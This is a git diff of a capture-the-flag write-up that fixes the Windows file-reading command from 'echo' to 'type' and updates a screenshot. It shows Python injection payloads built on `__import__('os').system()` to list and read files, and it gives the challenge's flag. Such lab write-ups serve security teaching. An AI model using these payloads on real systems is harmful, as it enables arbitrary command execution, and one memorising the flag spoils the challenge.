@@ -30,15 +30,15 @@ OR
 `__import__('os').system('dir')`
 
 ### Step 2
-Now we know that there's a file called `flag-afd3ca89be90859c70e89a903f09f9fb.txt` so we can just display the content by using `cat` or `echo` depends on the OS you're using.
+Now we know that there's a file called `flag-afd3ca89be90859c70e89a903f09f9fb.txt` so we can just display the content by using `cat` or `type` depends on the OS you're using.
 
 >Linux OS:
 `__import__('os').system('cat flag-afd3ca89be90859c70e89a903f09f9fb.txt')`
 
 >Windows OS:
-`__import__('os').system('echo flag-afd3ca89be90859c70e89a903f09f9fb.txt')`
+`__import__('os').system('type flag-afd3ca89be90859c70e89a903f09f9fb.txt')`
 
-![image](https://github.com/user-attachments/assets/e87d58ab-30ce-4629-9e00-7103aba4c632)
+![image](https://github.com/user-attachments/assets/254bd2e3-7f9d-484a-8470-08befb211702)
 
 ### Flag 
 >flag{93da9b115c23778dafd95da03f642d48}
